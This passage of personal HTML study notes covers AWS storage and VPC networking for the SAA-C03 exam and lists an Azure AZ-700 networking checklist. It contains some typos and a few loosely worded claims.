<li>When an object is locked in compliance mode, its retention mode can‚Äôt be changed, and tis retention period can‚Äôt be shortened.</li>
<li>Compliance mode helps ensure that an object version can‚Äôt be overwritten or deleted for the duration of the retention period</li>
</ul>
</li>
</ul>
<h2 id="s3-event-notifications-1"><a class="header" href="#s3-event-notifications-1">S3 Event Notifications</a></h2>
<ul>
<li>Automatically react to events within S3</li>
<li>Send events to SNS, SQS, Lambda, or Event Bridge. Event Bridge can then send the notification to many other AWS services
<ul>
<li>S3 requires permissions to these resources</li>
</ul>
</li>
<li>Use case: generate thumbnails of images</li>
</ul>
<h2 id="s3-access-point"><a class="header" href="#s3-access-point">S3 Access Point</a></h2>
<ul>
<li>Simplify security management for S3 buckets</li>
<li>Each access point has its own DNS name and access point policy (similar to a bucket policy)</li>
</ul>
<h2 id="aws-transfer-family"><a class="header" href="#aws-transfer-family">AWS Transfer Family</a></h2>
<ul>
<li>Use FTP, FTPS, or sFTP to transfer files to AWS</li>
<li>Pay per provisioned endpoint per hour + data transfer in GB</li>
<li>Integrate with existing Authentication system</li>
<li>Usage: Sharing files, public datasets, etc.</li>
</ul>
<h2 id="aws-datasync"><a class="header" href="#aws-datasync">AWS DataSync</a></h2>
<ul>
<li>Move large amount of data to and from on-prem or other cloud locations into AWS
<ul>
<li>Use NFS, SMB, HDFS, etc. Needs an agent installed.</li>
</ul>
</li>
<li>Move AWS service to another AWS service, no agent required.</li>
<li>Replication tasks are scheduled (synced)</li>
<li><b>Preserve file permissions and metadata</b> Remember this for the exam!!</li>
<li>One agent can use up to 10 Gbps. However, you can setup limits.</li>
</ul>
<h2 id="storage-comparison"><a class="header" href="#storage-comparison">Storage Comparison</a></h2>
<p>‚Ä¢ S3: Object Storage
‚Ä¢ S3 Glacier: Object Archival
‚Ä¢ EBS volumes: Network storage for one EC2 instance at a time
‚Ä¢ Instance Storage: Physical storage for your EC2 instance (high IOPS)
‚Ä¢ EFS: Network File System for Linux instances, POSIX filesystem
‚Ä¢ FSx for Windows: Network File System for Windows servers
‚Ä¢ FSx for Lustre: High Performance Computing Linux file system
‚Ä¢ FSx for NetApp ONTAP: High OS Compatibility
‚Ä¢ FSx for OpenZFS: Managed ZFS file system
‚Ä¢ Storage Gateway: S3 &amp; FSx File Gateway, Volume Gateway (cache &amp; stored), Tape Gateway
‚Ä¢ Transfer Family: FTP, FTPS, SFTP interface on top of Amazon $3 or Amazon EFS
‚Ä¢ DataSync: Schedule data sync from on-premises to AWS, or AWS to AWS
‚Ä¢ Snowcone / Snowball / Snowmobile: to move large amount of data to the cloud, physically
‚Ä¢ Database: for specific workloads, usually with indexing and querying</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="vpc-endpoint-cheatsheet"><a href="#vpc-endpoint-cheatsheet" class="header">Vpc-endpoint-cheatsheet</a></h1>
<ul>
<li>VPC Endpoints help keep traffic between AWS services within the AWS Network</li>
<li>There are two types of VPC Endpoints
<ul>
<li>Interface Endpoints</li>
<li>Gateway Endpoints</li>
</ul>
</li>
</ul>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Interface Endpoints</th><th>Gateway Endpoints</th></tr>
</thead>
<tbody>
<tr><td><b> Cost money </b></td><td><b> free </b></td></tr>
<tr><td>Uses as <b> Elastic Network Interface (ENI) </b> with private IP (powered by AWS PrivateLink)</td><td>a target for a specific route in the route table</td></tr>
<tr><td>support many AWS services</td><td>only supports S3 and DynamoDB</td></tr>
</tbody>
</table>
</div>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="vpc-flow-logs-cheatsheet"><a href="#vpc-flow-logs-cheatsheet" class="header">Vpc-flow-logs-cheatsheet</a></h1>
<ul>
<li><b> VPC Flow Logs </b> monitor the in-and-out traffic of your network INterfaces within your PC</li>
<li>You can turn on FLow logs at the VPC, Subnet or Network Interface level</li>
<li>VPC FLow logs <b> cannot be tagged </b> like other AWS resources</li>
<li>You <b> cannot change the configuration </b> of a flow log after it‚Äôs created</li>
<li>You <b> cannot enable </b> flow logs for VPCs which are peered with your VPC <b> unless it is in the same account </b></li>
<li>VPC FLow logs can be delivered to an <b>S3 or CLoudWatch Logs </b></li>
<li>VPC Flow logs <ins> contains the source and destination IP addresses </ins>(not hostnames)</li>
<li>Some instance traffic is <b> <ins> not monitored </ins> </b>:
<ul>
<li>Instance traffic generated by contacting the AWS DNS servers</li>
<li>Windows license activation traffic from instances</li>
<li>Traffic to and from the instance metadta address (169.254.169.254)</li>
<li>DHCP Traffic</li>
<li>Any Traffic to the reserved IP address of the default VPC router</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="introduction-to-vpc-1"><a href="#introduction-to-vpc-1" class="header">Introduction to VPC</a></h1>
<ul>
<li><a href="#introduction-to-vpc">Introduction to VPC</a></li>
<li><a href="#core-components">Core Components</a></li>
<li><a href="#key-features">Key Features</a></li>
<li><a href="#default-vpc">Deafult VPC</a></li>
<li><a href="#vpc-peering-1">VPC Peering</a></li>
<li><a href="#route-tables">Route Tables</a></li>
<li><a href="#internet-gateway-igw">Internet Gateway (IGW)</a></li>
<li><a href="#bastionjumpbox">Bastion/Jumpbox</a></li>
<li><a href="#direct-connect-1">Direct Connect</a></li>
<li><a href="#vpc-endpoints-1">VPC Endpoints</a>
<ul>
<li><a href="#interface-endpoints">Interface Endpoints</a></li>
<li><a href="#vpc-gateway-endpoints">VPC Gateway Endpoints</a></li>
</ul>
</li>
<li><a href="#vpc-flow-logs-1">VPC Flow Logs</a></li>
<li><a href="#nacls">NACLs</a></li>
<li><a href="#security-groups-3">Security Groups</a></li>
<li><a href="#nacl-vs-security-groups">NACL v/s Security Groups</a></li>
<li><a href="#site-to-site-vpn--virtual-private-gateway-and-customer-gateway">Site to Site VPN , Virtual Private Gateway and Customer Gateway</a></li>
<li><a href="#secrets-manager-1">Secrets Manager</a></li>
</ul>
<hr>
<h2 id="introduction-to-vpc"><a class="header" href="#introduction-to-vpc">Introduction to VPC</a></h2>
<hr>
<ul>
<li>Think of a AWS VPC as your own personal data centre</li>
<li>Gives you complete control over your virtual networking environment.</li>
</ul>
<hr>
<h2 id="core-components"><a class="header" href="#core-components">Core Components</a></h2>
<hr>
<ul>
<li>Internet Gateway (IGW)</li>
<li>Virtual Private Gateway (VPN Gateway)</li>
<li>Routing Tables</li>
<li>Network Access Control Lists (NACLs) - Stateless</li>
<li>Security Groups (SG) Stateful</li>
<li>Public Subnets</li>
<li>Private Subnets</li>
<li>Nat Gateway</li>
<li>Customer Gateway</li>
<li>VPC Endpoints</li>
<li>VPC Peering</li>
</ul>
<hr>
<h2 id="key-features"><a class="header" href="#key-features">Key Features</a></h2>
<hr>
<ul>
<li>VPCs are Region Specific they do not span regions</li>
<li>You can create 5 VPC per region</li>
<li>Every region comes with a default VPC</li>
<li>You can have 200 subnets per VPC</li>
<li>You can use IPv4 Cidr Blocks (the address of the VPC)</li>
<li>Cost nothing: VPC‚Äôs, Route Tables, Nacls, Internet Gateways, Security Groups and Subnets, VPC Peering</li>
<li>Some things cost money: eg. NAT Gateway, VPC Endpoints, VPN Gateway, Cutomer Gateway</li>
<li>DNS hostnames (should your instance have domain)</li>
</ul>
<hr>
<h2 id="default-vpc"><a class="header" href="#default-vpc">Default VPC</a></h2>
<hr>
<ul>
<li>Craete a VPC with a szie/16 IPv4 CIDR block (172.31.0.0./16)</li>
<li>Create a size /20 default subnet in each AZ</li>
<li>Create an Internet Gateway and connect it to your default VPC</li>
<li>Create a default security  group and associate it with your default VPC</li>
<li>Create a default network access control list (NACL) and associate it with your default VPC</li>
<li>Associate the default DHCP options set for your AWS account with your default VPC</li>
<li>when you create a VPC, it automatically has a main route table</li>
</ul>
<hr>
<h2 id="vpc-peering-1"><a class="header" href="#vpc-peering-1">VPC Peering</a></h2>
<hr>
<ul>
<li>
<p>VPC  Peering allows to connect one VPC with another over a direct network route using private IP addresses</p>
</li>
<li>
<p>Instances on peered VPCs <b> behave </b> just like they are on the <b>same network</b></p>
</li>
<li>
<p>Connect VPCs across <b>same</b> or <b> different AWS accounts </b> and <b> regions </b></p>
</li>
<li>
<p>Peering uses a <ins> <b> Star Configuration: 1 Central VPC - 4 other VPCs</b></ins></p>
</li>
<li>
<p><b> No Transitive Peering </b> (peering must take place directly between VPCs)</p>
<ul>
<li>Needs a one to one connect to immediate VPC</li>
</ul>
</li>
<li>
<p><b> No Overlapping CIDR Blocks </b></p>
  <img src="clouds/aws/saa-c03/images/VPC/vpc-peering.jpg" width="40%" height="70%" />
</li>
</ul>
<hr>
<h2 id="route-tables"><a class="header" href="#route-tables">Route Tables</a></h2>
<hr>
<ul>
<li>
<p>Route Tables are used to determine where network traffic is directed</p>
</li>
<li>
<p>Each subnet in your VPC must be associated with a route table</p>
</li>
<li>
<p>A subnet can only be associated with one route table at a time, but you can associate multiple subnets with the same route table</p>
  <img src="clouds/aws/saa-c03/images/VPC/route-table.jpg" width="40%" height="70%" />
</li>
</ul>
<hr>
<h2 id="internet-gateway-igw"><a class="header" href="#internet-gateway-igw">Internet Gateway (IGW)</a></h2>
<hr>
<ul>
<li>
<p>The Internet Gateway allows your VPC access to the Internet</p>
</li>
<li>
<p>IGW does two things:</p>
<ol>
<li>Provide a target in your VPC route tables for internet-routable traffic</li>
<li>Perform network address translation (NAT) for instances that have been assigned public IPv4 addresses</li>
</ol>
</li>
<li>
<p>To route out to the internet you need to add in your route tables you need to add a route</p>
</li>
<li>
<p>To the internet gateway and set the Destination to be 0.0.0.0/0</p>
  <img src="clouds/aws/saa-c03/images/VPC/internet-gateway.jpg" width="60%" height="70%" />
</li>
</ul>
<hr>
<h2 id="bastionjumpbox"><a class="header" href="#bastionjumpbox">Bastion/Jumpbox</a></h2>
<hr>
<ul>
<li>
<p>Bastions are EC2 instances which are security harden.</p>
</li>
<li>
<p>They are designed to help you gain access to your EC2 instances via SSH or RCP that are in a <b> <ins> private subnet</ins> </b></p>
</li>
<li>
<p>They are also known as Jump boxes because you are jumping from one box to access another.</p>
</li>
<li>
<p><i><ins> NAT Gateways/Instances </ins> </i> are only intended for EC2 instances to gain outbound access to the internet for things such as security updates .</p>
</li>
<li>
<p>NATs cannot/should not be used as Bastions</p>
</li>
<li>
<p>System Manager‚Äôs <b> Sessions Manager </b> replaces the need for Bastions</p>
  <img src="clouds/aws/saa-c03/images/VPC/bastion.jpg" width="50%" height="40%" />
</li>
</ul>
<hr>
<h2 id="direct-connect-1"><a class="header" href="#direct-connect-1">Direct Connect</a></h2>
<hr>
<ul>
<li>
<p>AWS Direct Connect is the AWS Solution for establishing dedicated network connections from on-premises locations to AWS</p>
</li>
<li>
<p>Very fast network lower Bandwidth 50M-500M or Higher bandwidth 1GB or 10GB</p>
</li>
<li>
<p>Helps reduce network costs and increase bandwidth throughput (great for high traffic networks)</p>
</li>
<li>
<p>Provides a more consistent network experience than a typical internet based connection(reliable and secure)</p>
  <img src="clouds/aws/saa-c03/images/VPC/direct-connect.jpg" width="50%" height="40%" />
</li>
</ul>
<hr>
<h2 id="vpc-endpoints-1"><a class="header" href="#vpc-endpoints-1">VPC Endpoints</a></h2>
<hr>
<ul>
<li>
<p>{ <b> Think of a secret tunnel where you don‚Äôt have tp leave the AWS network</b>}</p>
</li>
<li>
<p>VPC Endpoints allow you to privately connect your VPC to other AWS services, and VPC endpoint services</p>
</li>
<li>
<p>There are two types of VPC Endpoints</p>
<ol>
<li>Interface endpoints</li>
<li>Gateway Endpoints</li>
</ol>
</li>
<li>
<p>Eliminates the need for an <b> <ins>Internet Gateway, NAT device, VPN connection or AWS Direct Connect </ins></b> connections</p>
</li>
<li>
<p>Instances in the VPC <ins> do not require a public IP address </ins> to communicate with service resources</p>
</li>
<li>
<p>Traffic between your VPC and other services <ins> does not leave the AWS network</ins></p>
</li>
<li>
<p><b> Horizontally scaled,redundant and highly available </b> VPC component</p>
</li>
<li>
<p>Allows secure communication between instances and services <b> without adding availability risks or bandwidth constraints </b> on your traffic</p>
  <img src="clouds/aws/saa-c03/images/VPC/vpc-endpoints.jpg" width="50%" height="40%" />
</li>
</ul>
<hr>
<h2 id="interface-endpoints"><a class="header" href="#interface-endpoints">Interface Endpoints</a></h2>
<hr>
<ul>
<li>Interface Endpoints are ELastic Network Interfaces (ENI) with a private IP address. They serve as an entry point for traffic going to a supported service
<ul>
<li>Interface Endpoints are powered by AWS PrivateLink</li>
<li>Access services hosted on AWS easily and securely by keeping your network traffic within the AWS network
<ul>
<li>~$7.5/mo
<ul>
<li>Pricing per VPC endpoint per AZ ($/hour) 0.01</li>
<li>Pricing per GB data processed ($) 0.01</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Interface Endpoints support the following AWS services
<ul>
<li>API GATeway</li>
<li>CloudFormation</li>
<li>CloudWatch</li>
<li>Kinesis</li>
<li>SageMaker</li>
<li>CodeBuild</li>
<li>AWS COnfig</li>
<li>EC2 API</li>
<li>ELB API</li>
<li>AWS KMS</li>
<li>Secrets Manager</li>
<li>Security Token Service</li>
<li>Service Catalog</li>
<li>SNS
-SQS</li>
<li>Systems Manager</li>
<li>Marketplace Partner Services</li>
<li>Endpoint Services in other AWS accounts</li>
</ul>
</li>
</ul>
<hr>
<h2 id="vpc-gateway-endpoints"><a class="header" href="#vpc-gateway-endpoints">VPC Gateway Endpoints</a></h2>
<hr>
<ul>
<li>A Gateway Endpoint is a gateway that is a target for a specific route in your route table, used for traffic destined for a supported AWS service.</li>
<li>To create a Gateway Endpoint, you must specify the VPC in which you want to create the endpoint, and the service to which you want to establish the connection</li>
<li>AWS Gateway Endpoint currently supports 2 services
<ul>
<li>Amazon S3</li>
<li>DynamoDB</li>
</ul>
</li>
</ul>
<hr>
<h2 id="vpc-flow-logs-1"><a class="header" href="#vpc-flow-logs-1">VPC Flow Logs</a></h2>
<hr>
<ul>
<li>
<p><b> VPC FLow Logs </b> allow you to capture <b> IP Traffic information </b> in-and-out of Network Interfaces withinn your VPC</p>
</li>
<li>
<p>Network Interfaces within your VPC</p>
</li>
<li>
<p>Flow Logs can be created for</p>
<ol>
<li>VPC</li>
<li>Subnets</li>
<li>Network Interface</li>
</ol>
</li>
<li>
<p>All log data is stored using Amazon <b> Cloudwatch Logs </b></p>
</li>
<li>
<p>After a Flow Log is created it can be viewed in details within CloudWatch Logs</p>
</li>
<li>
<p>[version][account-id][interface-id][srcaddr][dstaddr][srcport][destport][protocol][packets][bytes][start][end][action][log-status]</p>
</li>
<li>
<p>2 123456789010 eni-abc123de 172.31.16.139 172.31.16.21 20641 22 6 20 4249 1418530010 1418530070 ACCEPT OK</p>
<ul>
<li><b> Version </b> The VPC flow logs version</li>
<li><b> account- id </b> The AWS account ID for the flow log</li>
<li><b> interface-id </b> The ID of the network interface for which the traffic is recorded</li>
<li><b> srcaddr </b> The source IPv4 or Ipv6 address. The IPv4 address of the netwrok interface is always its private Ipv4 address</li>
<li><b> dstaddr </b> The destination IPv4 or Ipv6 address. The IPv4 address of the netwrok interface is always its private IPv4 address</li>
<li><b> srcport </b> The source port of the traffic</li>
<li><b> dstport </b> The destination port of the traffic</li>
<li><b> protocol </b> The IANA protocol number of the traffic. For more information, see assigned Internet  Protocol Numbers.</li>
<li><b> Packets </b> The number of packets transferred during the capture window</li>
<li><b> Bytes </b> The number of bytes transferred during the capture window</li>
<li><b> start </b> The time, in Unix Seconds of the start of the capture window</li>
<li><b> end </b> The time, in Unix seconds, of the end of the capture window</li>
<li><b> action </b> The action associated with the traffic
<ul>
<li>ACCEPT: The recorded traffic was permitted by the security groups or network ACls</li>
<li>REJECT: The recorded traffic was not permitted by the security groups or network ACls</li>
</ul>
</li>
<li><b> log-status </b> The logging status of the flow log
<ul>
<li>OK: Data is logging normally to the chosen destinations</li>
<li>NODATA: There was no network traffic to or from the network interface during the capture window</li>
<li>SKIPDATA: SOme flow log records were skipped during the capture window. This may be because of an internal capacity constraint or an internal error</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="nacls"><a class="header" href="#nacls">NACLs</a></h2>
<hr>
<ul>
<li>
<p>Network Access Control List (NACLs)</p>
</li>
<li>
<p>An (optional) layer of Security that acts as a  <b><ins>firewall for controlling traffic in and out of subnet(s) </ins></b>.</p>
</li>
<li>
<p>NACLs acts as a virtual firewall at the subnet level</p>
  <img src="clouds/aws/saa-c03/images/VPC/nacl.jpg" width="50%" height="40%" />
</li>
<li>
<p>VPCs automatically get a default NACL</p>
</li>
<li>
<p>Subnets are associated with NACLs. Subnets can only belong to a single NACL</p>
</li>
<li>
<p>Each NACL contains a set of rules that can allow or deny traffic into (inbound) and out of (outbound)</p>
</li>
<li>
<p>Rule # determines the order of evaluation. From lowest to highest. The highest rule # can be 32766 and its recommended to work in 10 or 100 increments.</p>
</li>
<li>
<p>You can allow or deny traffic. You could block a single IP address (You can‚Äôt do this without Security Groups)</p>
</li>
<li>
<p><b> Use Case </b></p>
<ul>
<li>
<p>We determine there is a malicious actor at a specific IP address is trying to access our instances so we block their IP</p>
</li>
<li>
<p>We never need to SSH into instances so we add a DENY for these subnets. This is just an additional measure in case our security groups SSH port was left open .</p>
  <img src="clouds/aws/saa-c03/images/VPC/nacl-usecase.jpg" width="50%" height="40%" />
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="security-groups-3"><a class="header" href="#security-groups-3">Security Groups</a></h2>
<hr>
<ul>
<li>
<p><b> Security Groups </b></p>
<ul>
<li>A virtual <b> firewall </b> that controls the traffic to and from EC2 Instances</li>
</ul>
</li>
<li>
<p>Security Groups are associated with Ec2 instances</p>
</li>
<li>
<p>Each Security Group contains a set of rules that filter traffic coming into (inbound) and out of (outbound) Ec2 instances.</p>
</li>
<li>
<p>There are no ‚ÄòDeny‚Äô rules. All traffic is blocked by default unless a rule specifically allows it.</p>
</li>
<li>
<p>Multiple Instances across multiple subnets can belong to a Security Group.</p>
  <img src="clouds/aws/saa-c03/images/VPC/security-groups.jpg" width="50%" height="40%" />
</li>
<li>
<p>Use Case:</p>
<ul>
<li>You can specify the source to be an IP range or a specific ip (/32 is a specific IP address)</li>
<li>You can specify the source to be another security group</li>
<li>An instance can belong to multiple Security Groups, and rules are permissive (instead of restrictive) Meaning if you have one  Security group which has no allow and you add an allow to another than it will allow.</li>
</ul>
</li>
<li>
<p>Limits:</p>
<ul>
<li>You can have upto 10,000 Security Groups in a Region (default is 2,500)</li>
<li>You can have 60 inbound rules and 60 outbound rules per security Group
-16 Security Groups per Elastic Network Interface (ENI) (default is 5)</li>
</ul>
</li>
</ul>
<hr>
<h2 id="nacl-vs-security-groups"><a class="header" href="#nacl-vs-security-groups">NACL v/s Security Groups</a></h2>
<hr><img src="clouds/aws/saa-c03/images/VPC/nacl_security_groups.png" width="77%" height="40%" />
<img src="clouds/aws/saa-c03/images/VPC/security-groups-vs-nacl.jpg" width="77%" />
<img src="clouds/aws/saa-c03/images/VPC/nacl-vs-security-groups.jpg" width="77%" height="40%" />
<hr>
<h2 id="site-to-site-vpn--virtual-private-gateway-and-customer-gateway"><a class="header" href="#site-to-site-vpn--virtual-private-gateway-and-customer-gateway">Site to Site VPN , Virtual Private Gateway and Customer Gateway</a></h2>
<hr><img src="clouds/aws/saa-c03/images/VPC/site-to-site-vpn.jpg" width="77%" height="40%" />
<ul>
<li><strong> Virtual Private Gateway (VGW) </strong>
<ul>
<li>VPN concentrator on the AWS side of the VPN connection</li>
<li>VGW is created and attached to the VPC from which you want to create Site-to-Site VPN connection</li>
</ul>
</li>
<li><strong> Customer Gateway Device (On-Premises) </strong>
<ul>
<li>What IP address to use?
<ul>
<li>Public Internet-routable IP address for your Customer Gateway device</li>
<li>If it‚Äôs behind a NAT device that‚Äôs enabled for NAT traversal (NAT-T), use the public IP address of the NAT device
<img src="clouds/aws/saa-c03/images/VPC/customer-gateway-device.jpg" width="77%" /></li>
<li><strong> Important Step: </strong>
<ins>enable Route Propagation for the Virtual Private Gateway in the route table </ins> that is associated with your subnets</li>
<li><ins> If you need to ping your EC2 instances </ins> from on-premises, make sure you add the <strong>ICMP protocol </strong>on the inbound of your security groups</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="secrets-manager-1"><a class="header" href="#secrets-manager-1">Secrets Manager</a></h2>
<hr>
<ul>
<li>Helps to <ins> <i> manage, retrieve and rotate database credentials, application credentials, OAuth tokens, API keys and other secrets throughout their lifecycles
</i></ins></li>
<li>Helps to <ins> improve security posture </ins>, because you no longer need hard-coded credentials in application source code.
<ul>
<li>Storing the credentials in Secrets Manager <ins> helps to avoid possible compromise by anyone who can inspect the application </ins> or the components.</li>
<li><ins>Replace hard-coded credentials </ins> with a runtime call to the Secrets Manager service to retrieve credentials with a runtime call to the Secrets Manager service to retrieve credentials dynamically when you need them.</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure"><a class="header" href="#azure">Azure</a></h1>
<p>Notes related to Microsoft Azure.</p>
<h2 id="directory-map-4"><a class="header" href="#directory-map-4">Directory Map</a></h2>
<ul>
<li><a href="clouds/azure/az700">az700</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="core-networking-infrastructure-checklist"><a class="header" href="#core-networking-infrastructure-checklist">Core Networking Infrastructure Checklist</a></h1>
<h2 id="design-and-implement-private-ip-addressing-for-azure-resources"><a class="header" href="#design-and-implement-private-ip-addressing-for-azure-resources">Design and Implement Private IP Addressing for Azure Resources</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Plan and implement network segmentation and address spaces</li>
<li><input disabled="" type="checkbox" checked=""> Create a virtual network (VNet)</li>
<li><input disabled="" type="checkbox" checked=""> Plan and configure subnetting for services, including VNet gateways, private endpoints, firewalls, application gateways, VNet-integrated platform services, and Azure Bastion</li>
<li><input disabled="" type="checkbox" checked=""> Plan and configure subnet delegation</li>
<li><input disabled="" type="checkbox" checked=""> Create a prefix for public IP addresses</li>
<li><input disabled="" type="checkbox" checked=""> Choose when to use a public IP address prefix</li>
<li><input disabled="" type="checkbox" checked=""> Plan and implement a custom public IP address prefix (bring your own IP)</li>
<li><input disabled="" type="checkbox" checked=""> Create a new public IP address</li>
<li><input disabled="" type="checkbox" checked=""> Associate public IP addresses to resources</li>
</ul>
<h2 id="design-and-implement-name-resolution"><a class="header" href="#design-and-implement-name-resolution">Design and Implement Name Resolution</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Design name resolution inside a VNet</li>
<li><input disabled="" type="checkbox" checked=""> Configure DNS settings for a VNet</li>
<li><input disabled="" type="checkbox" checked=""> Design public DNS zones</li>
<li><input disabled="" type="checkbox" checked=""> Design private DNS zones</li>
<li><input disabled="" type="checkbox" checked=""> Configure a public or private DNS zone</li>
<li><input disabled="" type="checkbox" checked=""> Link a private DNS zone to a VNet</li>
</ul>
<h2 id="design-and-implement-vnet-connectivity-and-routing"><a class="header" href="#design-and-implement-vnet-connectivity-and-routing">Design and Implement VNet Connectivity and Routing</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Design service chaining, including gateway transit</li>
<li><input disabled="" type="checkbox" checked=""> Design virtual private network (VPN) connectivity between VNets</li>
<li><input disabled="" type="checkbox" checked=""> Implement VNet peering</li>
<li><input disabled="" type="checkbox" checked=""> Design and implement user-defined routes (UDRs)</li>
<li><input disabled="" type="checkbox" checked=""> Associate a route table with a subnet</li>
<li><input disabled="" type="checkbox" checked=""> Configure forced tunneling</li>
<li><input disabled="" type="checkbox"> Diagnose and resolve routing issues</li>
<li><input disabled="" type="checkbox"> Design and implement Azure Route Server</li>
<li><input disabled="" type="checkbox" checked=""> Identify appropriate use cases for a Virtual Network NAT gateway</li>
<li><input disabled="" type="checkbox" checked=""> Implement a NAT gateway</li>
</ul>
<h2 id="monitor-networks"><a class="header" href="#monitor-networks">Monitor Networks</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Configure monitoring, network diagnostics, and logs in Azure Network Watcher</li>
<li><input disabled="" type="checkbox" checked=""> Monitor and repair network health using Azure Network Watcher</li>
<li><input disabled="" type="checkbox" checked=""> Activate and monitor distributed denial-of-service (DDoS) protection</li>
<li><input disabled="" type="checkbox"> Activate and monitor Microsoft Defender for DNS</li>
</ul>
<h1 id="design-implement-and-manage-connectivity-services-checklist"><a class="header" href="#design-implement-and-manage-connectivity-services-checklist">Design, Implement, and Manage Connectivity Services Checklist</a></h1>
<h2 id="design-implement-and-manage-a-site-to-site-vpn-connection"><a class="header" href="#design-implement-and-manage-a-site-to-site-vpn-connection">Design, Implement, and Manage a Site-to-Site VPN Connection</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Design a site-to-site VPN connection, including for high availability</li>
<li><input disabled="" type="checkbox" checked=""> Select an appropriate VNet gateway SKU for site-to-site VPN requirements</li>
<li><input disabled="" type="checkbox" checked=""> Implement a site-to-site VPN connection</li>
<li><input disabled="" type="checkbox" checked=""> Identify when to use a policy-based VPN versus a route-based VPN connection</li>
<li><input disabled="" type="checkbox" checked=""> Create and configure an IPsec/IKE policy</li>
<li><input disabled="" type="checkbox" checked=""> Diagnose and resolve virtual network gateway connectivity issues</li>
<li><input disabled="" type="checkbox" checked=""> Implement Azure Extended Network</li>
</ul>
<h2 id="design-implement-and-manage-a-point-to-site-vpn-connection"><a class="header" href="#design-implement-and-manage-a-point-to-site-vpn-connection">Design, Implement, and Manage a Point-to-Site VPN Connection</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Select an appropriate virtual network gateway SKU for point-to-site VPN requirements</li>
<li><input disabled="" type="checkbox" checked=""> Select and configure a tunnel type</li>
<li><input disabled="" type="checkbox" checked=""> Select an appropriate authentication method</li>
<li><input disabled="" type="checkbox" checked=""> Configure RADIUS authentication</li>
<li><input disabled="" type="checkbox" checked=""> Configure certificate-based authentication</li>
<li><input disabled="" type="checkbox" checked=""> Configure authentication using Azure Active Directory (Azure AD), part of Microsoft Entra</li>
<li><input disabled="" type="checkbox" checked=""> Implement a VPN client configuration file</li>
<li><input disabled="" type="checkbox" checked=""> Diagnose and resolve client-side and authentication issues</li>
<li><input disabled="" type="checkbox"> Specify Azure requirements for Always On authentication</li>
<li><input disabled="" type="checkbox"> Specify Azure requirements for Azure Network Adapter</li>
</ul>
<h2 id="design-implement-and-manage-azure-expressroute"><a class="header" href="#design-implement-and-manage-azure-expressroute">Design, Implement, and Manage Azure ExpressRoute</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Select an ExpressRoute connectivity model</li>
<li><input disabled="" type="checkbox"> Select an appropriate ExpressRoute SKU and tier</li>
<li><input disabled="" type="checkbox" checked=""> Design and implement ExpressRoute to meet requirements, including cross-region connectivity, redundancy, and disaster recovery</li>
<li><input disabled="" type="checkbox" checked=""> Design and implement ExpressRoute options, including Global Reach, FastPath, and ExpressRoute Direct</li>
<li><input disabled="" type="checkbox" checked=""> Choose between private peering only, Microsoft peering only, or both</li>
<li><input disabled="" type="checkbox" checked=""> Configure private peering</li>
<li><input disabled="" type="checkbox" checked=""> Configure Microsoft peering</li>
<li><input disabled="" type="checkbox" checked=""> Create and configure an ExpressRoute gateway</li>
<li><input disabled="" type="checkbox" checked=""> Connect a virtual network to an ExpressRoute circuit</li>
<li><input disabled="" type="checkbox" checked=""> Recommend a route advertisement configuration</li>
<li><input disabled="" type="checkbox" checked=""> Configure encryption over ExpressRoute</li>
<li><input disabled="" type="checkbox" checked=""> Implement Bidirectional Forwarding Detection</li>
<li><input disabled="" type="checkbox" checked=""> Diagnose and resolve ExpressRoute connection issues</li>
</ul>
<h2 id="design-and-implement-an-azure-virtual-wan-architecture"><a class="header" href="#design-and-implement-an-azure-virtual-wan-architecture">Design and Implement an Azure Virtual WAN Architecture</a></h2>
<ul>
<li><input disabled="" type="checkbox"> Select a Virtual WAN SKU</li>
<li><input disabled="" type="checkbox"> Design a Virtual WAN architecture, including selecting types and services</li>
<li><input disabled="" type="checkbox" checked=""> Create a hub in Virtual WAN</li>
<li><input disabled="" type="checkbox"> Choose an appropriate scale unit for each gateway type</li>
<li><input disabled="" type="checkbox"> Deploy a gateway into a Virtual WAN hub</li>
<li><input disabled="" type="checkbox"> Configure virtual hub routing</li>
<li><input disabled="" type="checkbox"> Create a network virtual appliance (NVA) in a virtual hub</li>
<li><input disabled="" type="checkbox"> Integrate a Virtual WAN hub with a third-party NVA</li>
</ul>
<h1 id="design-and-implement-application-delivery-services-checklist"><a class="header" href="#design-and-implement-application-delivery-services-checklist">Design and Implement Application Delivery Services Checklist</a></h1>
<h2 id="design-and-implement-an-azure-load-balancer"><a class="header" href="#design-and-implement-an-azure-load-balancer">Design and Implement an Azure Load Balancer</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Map requirements to features and capabilities of Azure Load Balancer</li>
<li><input disabled="" type="checkbox" checked=""> Identify appropriate use cases for Azure Load Balancer</li>
<li><input disabled="" type="checkbox"> Choose an Azure Load Balancer SKU and tier</li>
<li><input disabled="" type="checkbox" checked=""> Choose between public and internal</li>
<li><input disabled="" type="checkbox" checked=""> Create and configure an Azure Load Balancer</li>
<li><input disabled="" type="checkbox" checked=""> Implement a load balancing rule</li>
<li><input disabled="" type="checkbox" checked=""> Create and configure inbound NAT rules</li>
<li><input disabled="" type="checkbox" checked=""> Create and configure explicit outbound rules, including SNAT</li>
</ul>
<h2 id="design-and-implement-azure-application-gateway"><a class="header" href="#design-and-implement-azure-application-gateway">Design and Implement Azure Application Gateway</a></h2>
<ul>
<li><input disabled="" type="checkbox" checked=""> Map requirements to features and capabilities of Azure Application Gateway</li>
<li><input disabled="" type="checkbox" checked=""> Identify appropriate use cases for Azure Application Gateway</li>
<li><input disabled="" type="checkbox" checked=""> Create a back-end pool</li>
<li><input disabled="" type="checkbox" checked=""> Configure health probes</li>
